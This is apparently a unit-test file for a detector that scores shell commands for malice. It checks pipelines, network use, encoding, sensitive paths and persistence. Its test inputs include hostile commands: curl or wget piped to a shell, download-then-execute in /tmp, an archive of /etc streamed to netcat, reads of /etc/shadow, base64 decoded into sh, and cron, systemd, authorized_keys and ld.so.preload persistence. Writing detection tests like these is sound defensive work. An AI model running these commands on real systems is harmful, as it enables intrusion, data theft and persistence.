"""Feature extraction tests: structure, chains, network, encoding, paths, persistence."""

from __future__ import annotations

import unittest

import _bootstrap  # noqa: F401
from malscore.context import build_context
from malscore.features import extract_features as features


class ContextTest(unittest.TestCase):
    def test_wrapper_resolution(self) -> None:
        ctx = build_context("sudo -u svc env FOO=1 timeout 30 python3 /opt/app.py")
        execution = ctx.executions[0]
        self.assertEqual(execution.basename, "python3")
        self.assertEqual(execution.wrappers, ["sudo", "env", "timeout"])
        self.assertEqual(execution.assignments, ["FOO=1"])

    def test_nested_payloads_are_resolved_one_level_deep(self) -> None:
        ctx = build_context("bash -c 'sh -c \"id\"'")
        self.assertEqual(ctx.basenames, ["bash", "sh"])

    def test_substitution_executions(self) -> None:
        self.assertIn("curl", build_context("echo $(curl -s http://x/y)").basenames)

    def test_remote_command(self) -> None:
        ctx = build_context("ssh -i key.pem admin@10.0.0.1 'cat /etc/shadow'")
        self.assertEqual(ctx.remote_payloads, ["cat /etc/shadow"])

    def test_indicators(self) -> None:
        ctx = build_context("curl -s https://api.example.com:8443/v1 && ping6 2001:db8::1")
        self.assertEqual(ctx.urls[0].host, "api.example.com")
        self.assertIn(8443, ctx.ports)
        self.assertEqual(ctx.ipv6s, ["2001:db8::1"])

    def test_timestamp_is_not_an_ipv6(self) -> None:
        self.assertEqual(build_context("journalctl --since 12:30:15").ipv6s, [])

    def test_malformed_syntax_does_not_raise(self) -> None:
        for command in ("", "echo 'unterminated", "| | |", ">>>", "$(", "cmd &&", "\x00\x01"):
            self.assertIsInstance(features(command), dict)


class ChainTest(unittest.TestCase):
    def test_curl_pipe_shell(self) -> None:
        f = features("curl -fsSL https://example.com/install.sh | bash")
        self.assertTrue(f["network_to_shell_pipeline"])
        self.assertTrue(f["download_then_execute"])

    def test_wget_pipe_python(self) -> None:
        self.assertTrue(features("wget -qO- http://h/s.py | python3 -")["network_to_interpreter_pipeline"])

    def test_download_to_tmp_then_chmod(self) -> None:
        f = features("curl -o /tmp/x http://10.0.0.5/x && chmod +x /tmp/x && /tmp/x")
        self.assertTrue(f["download_to_tmp"])
        self.assertTrue(f["chmod_following_download"])
        self.assertTrue(f["downloaded_file_executed"])
        self.assertEqual(f["download_output_path"], "/tmp/x")

    def test_plain_download_is_not_execution(self) -> None:
        f = features("wget https://repo.example.com/pkg.tar.gz")
        self.assertTrue(f["network_download"])
        self.assertFalse(f["download_then_execute"])
        self.assertFalse(f["network_to_shell_pipeline"])

    def test_chain_inside_shell_payload(self) -> None:
        self.assertTrue(features("bash -c 'curl -s http://h/s.sh | sh'")["network_to_shell_pipeline"])


class NetworkTest(unittest.TestCase):
    def test_public_ip_and_port(self) -> None:
        f = features("nc -zv 203.0.113.9 4444")
        self.assertTrue(f["has_nonstandard_port"])
        self.assertTrue(f["uses_socket_tool"])

    def test_private_ip_is_not_public(self) -> None:
        self.assertFalse(features("ssh deploy@10.0.5.23")["has_public_ip"])
        self.assertTrue(features("ssh deploy@8.8.8.8")["has_public_ip"])

    def test_url_with_raw_ip(self) -> None:
        f = features("wget http://192.168.1.10/payload.tar.gz")
        self.assertTrue(f["url_has_ip_host"])
        self.assertTrue(f["has_http_url"])
        self.assertTrue(f["network_download"])

    def test_upload(self) -> None:
        self.assertTrue(features("curl -T backup.tgz https://files.example.com/")["upload_indicator"])
        self.assertTrue(features("scp db.sql ops@10.0.0.9:/backups/")["upload_indicator"])
        self.assertFalse(features("scp ops@10.0.0.9:/backups/db.sql .")["upload_indicator"])

    def test_archive_streamed_to_network(self) -> None:
        f = features("tar czf - /etc | nc 203.0.113.9 9000")
        self.assertTrue(f["archive_to_transfer_pipeline"])
        self.assertTrue(f["outbound_transfer_indicator"])


class EncodingTest(unittest.TestCase):
    def test_base64_decode_to_shell(self) -> None:
        f = features("echo aWQgLWEK | base64 -d | sh")
        self.assertTrue(f["base64_decode"])
        self.assertTrue(f["base64_to_interpreter"])
        self.assertGreaterEqual(f["obfuscation_characteristic_count"], 2)

    def test_hex_escapes(self) -> None:
        self.assertTrue(features(r"printf '\x69\x64' | sh")["char_construction"])

    def test_normal_command_is_not_obfuscated(self) -> None:
        self.assertEqual(features("git status")["obfuscation_characteristic_count"], 0)

    def test_eval_is_dynamic_construction(self) -> None:
        self.assertTrue(features('eval "$CMD"')["dynamic_command_construction"])


class PathTest(unittest.TestCase):
    def test_shadow(self) -> None:
        f = features("sudo cat /etc/shadow")
        self.assertTrue(f["touches_shadow"])
        self.assertTrue(f["touches_sensitive_path"])
        self.assertTrue(f["uses_sudo"])

    def test_tmp(self) -> None:
        self.assertTrue(features("cp /dev/shm/.x /tmp/.y")["touches_tmp"])

    def test_ordinary_path_is_not_sensitive(self) -> None:
        f = features("vim /home/alice/src/app/main.py")
        self.assertFalse(f["touches_sensitive_path"])
        self.assertTrue(f["touches_home"])


class PersistenceTest(unittest.TestCase):
    def test_cron(self) -> None:
        self.assertTrue(features("(crontab -l; echo '*/5 * * * * /tmp/x.sh') | crontab -")["crontab_edit"])
        self.assertFalse(features("crontab -l")["crontab_edit"])

    def test_systemd(self) -> None:
        self.assertTrue(features("sudo systemctl enable --now collector.service")["service_enable"])
        self.assertTrue(features("cat > /etc/systemd/system/x.service")["systemd_unit_write"])

    def test_authorized_keys_append(self) -> None:
        self.assertTrue(features("echo 'ssh-ed25519 AAAA' >> /home/bob/.ssh/authorized_keys")["authorized_keys_write"])

    def test_shell_startup(self) -> None:
        self.assertTrue(features("echo 'export PATH=$PATH:/tmp' >> ~/.bashrc")["shell_startup_write"])
        self.assertFalse(features("cat ~/.bashrc")["shell_startup_write"])

    def test_ld_preload(self) -> None:
        self.assertTrue(features("sudo tee /etc/ld.so.preload")["preload_persistence"])


if __name__ == "__main__":
    unittest.main()
